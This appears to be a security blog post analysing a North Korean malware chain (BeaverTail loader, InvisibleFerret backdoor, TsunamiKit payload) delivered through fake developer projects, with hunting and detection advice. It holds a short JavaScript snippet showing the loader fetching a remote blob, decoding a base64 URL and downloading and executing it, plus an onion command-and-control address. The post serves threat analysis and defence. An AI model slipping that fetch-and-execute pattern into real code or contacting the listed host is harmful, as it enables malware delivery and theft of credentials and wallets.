---
author: Sab0x1D
author_avatar: /assets/img/sab01xd-profile.jpeg
layout: listing
title: "From JSON Keeper to TsunamiKit — Inside the BeaverTail & InvisibleFerret Attack Chain"
pretty_title: "From JSON Keeper to TsunamiKit — Inside the BeaverTail & InvisibleFerret Attack Chain"
excerpt: "North Korean threat actors are now abusing fake API keys, JSON Keeper blobs, and GitHub-hosted Node.js projects to deliver a JavaScript loader known as BeaverTail, which drops a Python backdoor (InvisibleFerret) and a .NET payload called TsunamiKit. This blog breaks down the full chain, techniques, and detection strategies."
thumb: assets/img/current_threats2_thumb.jpg
date: 2025-11-15
featured: false
tags: [Malware, Threats, Awareness, NorthKorea, JS, Python, .NET]
---

# From JSON Keeper to TsunamiKit — Inside the BeaverTail & InvisibleFerret Attack Chain

![Hero Banner]({{ '/assets/img/beavertail_hero.png' | relative_url }}){: .img-center }

## Introduction
North Korean threat actors continue refining their tooling and delivery chains, focusing heavily on stealth, evasion, and blending into legitimate developer workflows. Their latest campaign abuses fake API keys, JSON Keeper blobs, and GitHub/GitLab-hosted Node.js projects to covertly deliver a JavaScript loader named **BeaverTail**, which then deploys a Python backdoor dubbed **InvisibleFerret**.

This post breaks down the full chain—from initial lure to final payload—so defenders, researchers, and analysts understand the tactics, techniques, and risks.

---

## 1. Overview of the Attack Chain

### BeaverTail (JavaScript Loader)
The infection begins with a **Node.js project** hosted on GitHub or GitLab, masquerading as a legitimate API-key rotation or developer automation demo. Once executed, it fetches a **base64-encoded JSON blob** from services like JSON Keeper.

![Stage 1 Diagram]({{ '/assets/img/stage1_beavertail.png' | relative_url }}){: .img-center }

BeaverTail handles:
- Data harvesting (wallet info, system metadata)
- Fetching and executing the next-stage Python backdoor
- Obfuscated JavaScript routines for evasion

---

## InvisibleFerret (Python Backdoor)
Once dropped, InvisibleFerret initiates several modular payloads such as **way**, **pow**, **brow99_9f**, and **pay99_8f**, each responsible for:
- Keylogging  
- Browser data theft  
- Persistence mechanisms  
- Data exfiltration  

![InvisibleFerret modules]({{ '/assets/img/invisibleferret_modules.png' | relative_url }}){: .img-center }

---

## TsunamiKit (.NET Payload)
The final stage involves a **.NET executable**, delivered via the "Tsunami Installer," designed for:
- System reconnaissance  
- Wallet & credential exfiltration  
- TOR-based communication  
- Optional remote control features  

---

## 2. Infection Vector — JSON Keeper + Fake API Keys

The entry vector is social engineering via:
- LinkedIn messages  
- Developer outreach  
- Fake recruitment lures  
- GitHub/GitLab project invitations  

The provided project contains:
- A `.env` file containing spoofed API keys  
- A script referencing an external JSON blob (JSON Keeper, JSON Silo, etc.)
- Silent execution logic to trigger BeaverTail

This vector is effective because:
- Developer workflows are shared and trusted
- JSON blob services are rarely blocked
- Base64 obfuscation hides the malicious URL
- Node.js → Python execution appears plausible in dev environments

---

## 3. Technical Deep Dive

### 3.1 Stage 1 — BeaverTail Execution
BeaverTail retrieves:
- Base64-encoded download URLs
- Python backdoor scripts
- Runtime config values for exfil and persistence

Typical behavior:
```js
const config = await fetch(remoteJsonBlob);
const url = Buffer.from(config.payload, 'base64').toString();
downloadAndExecute(url);
```

---

### 3.2 Stage 2–4 — InvisibleFerret Modules
The Python loader downloads modules “way” and “pow,” then moves on to payloads like “brow99_9f” or “pay99_8f” for:
- Keylogging
- Clipboard monitoring
- Browser credential harvesting
- Data exfiltration to an onion C2

Modules also handle:
- AnyDesk downloader + config
- Injector execution
- Tsunami Installer stage setup

---

### 3.3 Stage 5 — TsunamiKit Final Payload
Delivered from a TOR hidden service such as:
```
m34kr3z26f3jp4ckmuvv5jyg4atumdxhgjgsmuc6s6jac56khdy5zqd.onion
```

Capabilities include:
- Full system profiling  
- Credential theft  
- Crypto wallet targeting  
- TOR‑based persistence channels  

---

## 4. OSINT & Threat Hunting Opportunities

Analysts can pivot via:
### Public GitHub Projects
Search for suspicious repos:
```
filename:.env api_key
"jsonkeeper.com/b" 
"base64" AND "fetch" AND "node"
```

### JSON Keeper Blobs
Look for:
- Single-field JSON entries
- base64 strings over 200 bytes
- URLs ending in `.exe`, `.py`, `.zip`, `.bin`

### YARA Hunting
Rules can detect:
- module names (`brow99_9f`, `pay99_8f`)
- Python loader structure
- Node.js blob fetch pattern  

---

## 5. Detection, Prevention & Response

### Endpoint Monitoring
Detect suspicious chains:
- `node.exe` → `python.exe` → `.NET exe`
- AnyDesk installs from non-admin users

### Network Controls
- Block JSON Keeper domains if not needed
- Inspect base64 content in outbound HTTPS
- Flag TOR entry node connections

### Hardening
- Application allow‑listing
- Dev environment segmentation
- Removing local admin privileges
- SOC alerting for GitHub clone activity

---

## Conclusion

This campaign demonstrates how modern threat actors camouflage malicious payloads in developer-centric workflows. By abusing JSON blob services, GitHub repos, Node.js loaders, and chained Python/.NET payloads, the attackers achieve stealth, modularity, and persistence.

Defenders must now treat development infrastructure as part of the threat landscape—monitoring JSON blobs, script execution chains, and suspicious Git activity to keep ahead of these sophisticated techniques.

---
